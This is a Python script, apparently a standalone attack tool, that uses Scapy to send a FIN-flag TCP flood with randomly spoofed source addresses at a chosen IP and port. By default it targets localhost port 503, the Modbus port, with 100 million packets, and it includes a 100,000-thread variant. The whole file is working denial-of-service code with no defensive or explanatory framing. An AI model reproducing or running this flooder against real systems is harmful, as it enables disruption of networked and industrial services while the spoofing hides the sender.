from scapy.all import *
import random
import threading
import time


def randomIP():
 ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
 return ip

def randInt():
 x = random.randint(1000,9000)
 return x

def FIN_Flood(dstIP,dstPort,counter):
 total = 0
 print("Sending packets ...")
 for x in range (0,counter):
  s_port = randInt()
  s_eq = randInt()
  w_indow = randInt()

  IP_Packet = IP ()
  IP_Packet.src = randomIP()
  IP_Packet.dst = dstIP

  TCP_Packet = TCP () 
  TCP_Packet.sport = s_port
  TCP_Packet.dport = dstPort
  TCP_Packet.flags = "F"
  TCP_Packet.seq = s_eq
  TCP_Packet.window = w_indow

  send(IP_Packet/TCP_Packet, verbose=0)
  total+=1
 #sys.stdout.write("\nTotal packets sent: %i\n" % total)
 print(f"Tot packets sent: {total}")
 
def attack_thread(dstIP, dstPort, counter, num_threads=100000):
    threads = []
    
    for i in range(num_threads):
        thread = threading.Thread(target=FIN_Flood, args=(dstIP, dstPort, counter // num_threads))
        threads.append(thread)
        thread.start()

    # Join the threads to make sure all finish
    for thread in threads:
        thread.join()

def main():
 dstIP,dstPort = "127.0.0.1", "503"
 counter = 100000000 #input ("How many packets do you want to send : ")
 FIN_Flood(dstIP,int(dstPort),counter)

main()